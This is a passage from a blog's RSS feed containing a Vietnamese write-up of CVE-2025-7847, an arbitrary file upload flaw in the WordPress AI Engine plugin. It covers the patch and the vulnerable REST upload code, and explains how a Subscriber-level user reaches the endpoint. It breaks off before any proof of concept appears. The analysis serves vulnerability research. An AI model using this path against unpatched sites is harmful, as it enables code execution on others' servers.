aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-forms/vulnerability/wordpress-ninja-forms-plugin-3-11-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Ninja Forms Plugin &amp;lt; 3.11.1 is vulnerable to PHP Object Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7847 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-13-cve-2025-7847/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-13-cve-2025-7847/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;AI Engine&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;arbitrary file upload&lt;/strong&gt; do thi·∫øu &lt;strong&gt;file type validation&lt;/strong&gt; trong h√†m &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; ·ªü c√°c phi√™n b·∫£n &lt;strong&gt;2.9.3&lt;/strong&gt; v√† &lt;strong&gt;2.9.4&lt;/strong&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;authenticated attackers&lt;/strong&gt; (nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c), v·ªõi quy·ªÅn &lt;strong&gt;Subscriber-level&lt;/strong&gt; tr·ªü l√™n, c√≥ th·ªÉ &lt;strong&gt;upload arbitrary files&lt;/strong&gt; l√™n &lt;strong&gt;server&lt;/strong&gt; c·ªßa trang web b·ªã ·∫£nh h∆∞·ªüng khi &lt;strong&gt;REST API&lt;/strong&gt; ƒë∆∞·ª£c b·∫≠t, t·ª´ ƒë√≥ c√≥ th·ªÉ d·∫´n ƒë·∫øn &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7847&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7847&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.9.3-2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do h√†m x·ª≠ l√Ω upload cho ph√©p ghi file tr·ª±c ti·∫øp (&lt;code&gt;copy()&lt;/code&gt;, &lt;code&gt;file_put_contents()&lt;/code&gt;) m√† &lt;strong&gt;kh√¥ng ki·ªÉm tra lo·∫°i file ho·∫∑c x√°c th·ª±c ng∆∞·ªùi d√πng&lt;/strong&gt;, n√™n attacker c√≥ th·ªÉ &lt;strong&gt;upload file t√πy √Ω (k·ªÉ c·∫£ &lt;code&gt;.php&lt;/code&gt;)&lt;/strong&gt; v√†o th∆∞ m·ª•c uploads v√† th·ª±c thi m√£ ƒë·ªôc.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#34; title=&#34;X√°c th·ª±c file type&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;X√°c th·ª±c file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;516&#34; width=&#34;1819&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√°c th·ª±c file type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Validate filename extension for base64 uploads&#xA;$validate = wp_check_filetype( $filename );&#xA;if ( $validate[&amp;#39;type&amp;#39;] == false ) {&#xA;  throw new Exception( &amp;#39;File type is not allowed.&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ th√™m ki·ªÉm tra lo·∫°i t·ªáp trong h√†m &lt;code&gt;simpleFileUpload&lt;/code&gt; v√† &lt;code&gt;upload_file&lt;/code&gt; b·∫±ng &lt;code&gt;wp_check_filetype()&lt;/code&gt; ƒë·ªÉ ch·ªâ cho ph√©p upload c√°c ƒë·ªãnh d·∫°ng h·ª£p l·ªá d·ª±a tr√™n whilelist c·ªßa WordPress&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt s·ªë Public API th√¥ng quan h√†m &lt;code&gt;rest_api_init()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;  $public_api = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api&amp;#39; );&#xA;  if ( !$public_api ) {&#xA;    return;&#xA;  }&#xA;  $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;  if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;    add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;  }&#xA;  register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;      return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;    },&#xA;  ] );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m s·∫Ω ki·ªÉm tra option &lt;strong&gt;Public API&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c b·∫≠t hay ch∆∞a. Theo &lt;a href=&#34;https://ai.thehiddendocs.com/public-rest-api/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;document&lt;/a&gt; c·ªßa plugin, m·∫∑c ƒë·ªãnh option n√†y s·∫Ω kh√¥ng ƒë∆∞·ª£c b·∫≠t:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;B·∫°n c√≥ th·ªÉ b·∫∑t ·ªü n√≥ Admin Dashboard t·∫°i &lt;code&gt;wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; title=&#34;enable the REST API&#34; data-thumbnail=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; data-sub-html=&#34;&lt;h2&gt;enable the REST API&lt;/h2&gt;&lt;p&gt;enable the REST API&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#39; alt=&#34;enable the REST API&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;enable the REST API&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo m√¥ t·∫£, khi b·∫≠t option n√†y l√™n, ch·ªâ nh·ªØng &lt;code&gt;authentified API requests&lt;/code&gt; m·ªõi ƒë∆∞·ª£c th√¥ng qua. C√≥ 2 c√°ch ƒë·ªÉ x√°c th·ª±c:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;X-WP-Nonce&lt;/code&gt;: L·∫•y th√¥ng qua JavaScript Object &lt;code&gt;wpApiSettings&lt;/code&gt; d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;Bearer Token&lt;/code&gt;: Do admin c·∫•u h√¨nh&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;  add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi Bearer Token ƒë∆∞·ª£c set,plugin s·∫Ω &lt;strong&gt;ƒëƒÉng k√Ω m·ªôt filter&lt;/strong&gt; c√≥ t√™n &lt;code&gt;mwai_allow_public_api&lt;/code&gt;,&#xA;v·ªõi &lt;strong&gt;callback&lt;/strong&gt; l√† ph∆∞∆°ng th·ª©c &lt;code&gt;auth_via_bearer_token&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;  &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;  &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;  &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;  },&#xA;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;M·ªôt api ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi method POST:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint: &lt;code&gt;/wp-json/mwai/v1/simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Callback: &lt;code&gt;rest_simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V·ªõi &lt;code&gt;permission_callback&lt;/code&gt; l√† k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa &lt;code&gt;can_access_public_api()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function can_access_public_api( $feature, $extra ) {&#xA;  $logged_in = is_user_logged_in();&#xA;  return apply_filters( &amp;#39;mwai_allow_public_api&amp;#39;, $logged_in, $feature, $extra );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WP REST API, h√†m &lt;code&gt;is_user_logged_in()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;true&lt;/code&gt;: N·∫øu ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p v√† header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; h·ª£p l·ªá&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;false&lt;/code&gt;: N·∫øu ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p ho·∫∑c header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; kh√¥ng h·ª£p l·ªá&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;can_access_public_api&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn filter &lt;code&gt;mwai_allow_public_api&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü tr√™n =&amp;gt; &lt;code&gt;auth_via_bearer_token($logged_in, $feature, $extra)&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function auth_via_bearer_token( $allow, $feature, $extra ) {&#xA;  if ( !empty( $extra ) &amp;amp;&amp;amp; !empty( $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; ) ) ) {&#xA;    $token = $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; );&#xA;    $token = str_replace( &amp;#39;Bearer &amp;#39;, &amp;#39;&amp;#39;, $token );&#xA;    if ( $token === $this-&amp;gt;bearer_token ) {&#xA;      // We set the current user to the first admin.&#xA;      $admin = $this-&amp;gt;core-&amp;gt;get_admin_user();&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;      return true;&#xA;    }&#xA;  }&#xA;  return $allow;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;auth_via_bearer_token()&lt;/code&gt; d√πng ƒë·ªÉ x√°c th·ª±c b·∫±ng Bearer Token.&#xA;Quy tr√¨nh c·ªßa n√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu request c√≥ header &lt;code&gt;Authorization&lt;/code&gt; ch·ª©a chu·ªói &lt;code&gt;Bearer &amp;lt;token&amp;gt;&lt;/code&gt;&#xA;v√† gi√° tr·ªã &lt;code&gt;&amp;lt;token&amp;gt;&lt;/code&gt; tr√πng v·ªõi token ƒë∆∞·ª£c l∆∞u trong t√πy ch·ªçn (&lt;code&gt;$this-&amp;gt;bearer_token&lt;/code&gt;), th√¨:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;G√°n ng∆∞·ªùi d√πng hi·ªán t·∫°i th√†nh admin ƒë·∫ßu ti√™n (&lt;code&gt;wp_set_current_user()&lt;/code&gt;),&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; ‚Üí cho ph√©p truy c·∫≠p API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng c√≥ ho·∫∑c token sai ‚Üí tr·∫£ v·ªÅ &lt;code&gt;$allow&lt;/code&gt;,&#xA;t·ª©c l√† k·∫øt qu·∫£ ki·ªÉm tra ban ƒë·∫ßu t·ª´ &lt;code&gt;is_user_logged_in()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;M·∫∑c ƒë·ªãnh, ta s·∫Ω kh√¥ng c√≥ &lt;strong&gt;Bearer Token&lt;/strong&gt; ƒë·ªÉ x√°c th·ª±c, n√™n ta c·∫ßn d·ª±a v√†o &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; h·ª£p l·ªá c·ªßa Subcriber user =&amp;gt; &lt;code&gt;permission_callback=true&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_simpleFileUpload( $request ) {&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;    $files = $request-&amp;gt;get_file_params();&#xA;    &#xA;    // Check if file is provided&#xA;    if ( empty( $files[&amp;#39;file&amp;#39;] ) ) {&#xA;      // Check for base64 encoded file data&#xA;      ...&#xA;      $result = $this-&amp;gt;simpleFileUpload( null, $base64, $filename, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    else {&#xA;      // Handle regular file upload&#xA;      $file = $files[&amp;#39;file&amp;#39;];&#xA;      $purpose = isset( $params[&amp;#39;purpose&amp;#39;] ) ? $params[&amp;#39;purpose&amp;#39;] : &amp;#39;files&amp;#39;;&#xA;      $ttl = isset( $params[&amp;#39;ttl&amp;#39;] ) ? intval( $params[&amp;#39;ttl&amp;#39;] ) : 3600;&#xA;      $target = isset( $params[&amp;#39;target&amp;#39;] ) ? $params[&amp;#39;target&amp;#39;] : null;&#xA;      $metadata = isset( $params[&amp;#39;metadata&amp;#39;] ) ? $params[&amp;#39;metadata&amp;#39;] : [];&#xA;      &#xA;      if ( $this-&amp;gt;debug ) {&#xA;        $debug = sprintf( &amp;#39;REST [SimpleFileUpload]: file upload, name=%s, purpose=%s&amp;#39;, &#xA;          $file[&amp;#39;name&amp;#39;], &#xA;          $purpose &#xA;        );&#xA;        Meow_MWAI_Logging::log( $debug );&#xA;      }&#xA;      &#xA;      $result = $this-&amp;gt;simpleFileUpload( $file, null, null, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    &#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $result ], 200 );&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage() ], 500 );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; x·ª≠ l√Ω upload file qua REST API.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y tham s·ªë v√† file t·ª´ &lt;code&gt;$request&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ file, ki·ªÉm tra d·ªØ li·ªáu base64 v√† g·ªçi &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu c√≥ file, l·∫•y c√°c tham s·ªë t√πy ch·ªçn (&lt;code&gt;purpose&lt;/code&gt;, &lt;code&gt;ttl&lt;/code&gt;, &lt;code&gt;target&lt;/code&gt;, &lt;code&gt;metadata&lt;/code&gt;), ghi log n·∫øu debug, r·ªìi g·ªçi &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ &lt;code&gt;WP_REST_Response&lt;/code&gt; v·ªõi &lt;code&gt;success =&amp;gt; true&lt;/code&gt; v√† d·ªØ li·ªáu file, ho·∫∑c &lt;code&gt;success =&amp;gt; false&lt;/code&gt; n·∫øu c√≥ l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function simpleFileUpload( $file = null, $base64 = null, $filename = null, $purpose = &amp;#39;files&amp;#39;, $ttl = 3600, $target = null, $metadata = [] ) {&#xA;  ...&#xA;  try {&#xA;    if ( !empty( $base64 ) ) {&#xA;     ...&#xA;    }&#xA;    else if ( !empty( $file ) &amp;amp;&amp;amp; is_array( $file ) ) {&#xA;      // Handle regular file upload&#xA;      if ( !empty( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;File upload error: &amp;#39; . $file[&amp;#39;error&amp;#39;] );&#xA;      }&#xA;      &#xA;      $refId = 